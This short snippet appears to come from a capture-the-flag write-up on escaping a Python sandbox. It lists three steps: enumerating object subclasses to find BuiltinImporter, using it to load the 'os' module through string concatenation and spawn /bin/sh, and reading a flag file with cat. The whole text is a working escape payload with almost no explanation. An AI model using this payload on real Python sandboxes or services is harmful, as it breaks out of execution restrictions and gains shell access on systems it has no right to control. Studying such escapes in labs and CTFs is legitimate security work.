### Examples

---

```py
1. find index of builtinimporter (80)
print(().__class__.__bases__[0].__subclasses__())
2. spawn shell using os.spawnl
().__class__.__bases__[0].__subclasses__()[80].load_module('o'+'s').spawnl(().__class__.__bases__[0].__subclasses__()[80].load_module('o'+'s').P_WAIT,'/bin/sh','sh')
3. cat flag
cat ../admin/flag.txt
```

